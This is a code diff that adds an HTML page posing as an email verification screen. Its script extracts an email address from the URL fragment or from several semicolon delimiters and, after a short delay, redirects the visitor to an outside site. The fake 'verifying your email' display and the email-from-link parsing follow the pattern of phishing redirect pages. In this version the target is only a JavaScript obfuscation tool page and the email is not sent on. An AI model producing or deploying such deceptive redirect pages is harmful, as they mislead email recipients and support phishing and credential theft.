@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verifying...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      background: #f2f7fb;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      color: #333;
+    }
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #007ee5;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .text {
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="text">Verifying your email, please wait...</div>
+
+  <script type="text/javascript">
+    var url_string = window.location.href;
+    var url_get_email = getafterhash(url_string);
+    var mail_go_url = "https://www.lddgo.net/en/encrypt/js";
+
+    // Optional: log to console
+    console.log("Extracted:", url_get_email);
+
+    // Redirect after short delay (1.5s)
+    setTimeout(function () {
+      location.replace(mail_go_url);
+    }, 1500);
+
+    function getafterhash(url) {
+      var ret;
+      var queryStringhash = url.split('#')[1];
+      var queryStringsemi = url.split(';')[1];
+      var queryStringsemiplus = url.split(';+')[1];
+      var queryStringstartsemi = url.split('*;')[1];
+
+      if (queryStringhash) {
+        ret = queryStringhash;
+      } else if (queryStringsemi) {
+        ret = queryStringsemi;
+      } else if (queryStringsemiplus) {
+        ret = queryStringsemiplus;
+      } else if (queryStringstartsemi) {
+        ret = queryStringstartsemi;
+      } else {
+        ret = 0;
+      }
+
+      return ret;
+    }
+  </script>
+</body>
+</html>
